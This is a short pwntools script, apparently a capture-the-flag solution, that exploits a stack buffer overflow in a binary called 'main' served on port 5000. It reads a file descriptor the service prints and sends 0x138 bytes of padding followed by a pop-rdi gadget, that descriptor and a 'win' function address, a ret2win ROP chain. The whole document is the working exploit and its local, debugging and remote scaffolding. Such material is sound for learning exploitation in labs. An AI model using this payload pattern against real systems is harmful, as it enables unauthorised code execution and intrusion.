from pwn import*
context.arch="amd64"
import shutil

# This resolves the absolute path (e.g., /usr/bin/kitty) and tricks pwntools into ignoring it
context.terminal = [shutil.which('kitty'), 'sh', '-c']
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc 0.0.0.0 5000"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b* vuln + 36
    c
    """)
    pause()
else:
    p=remote(r[1],int(r[2]),ssl=False)

poprdi=0x00000000004012b7
win = 0x0000000000401226+1


p.recvuntil(b"Bonjour")
fd = int(p.recvline()[:-1])

print(fd)


payload = b"a"*0x138+p64(poprdi)+p64(fd)+p64(win)


p.send(payload)


p.shutdown('send')

print(p.recv())
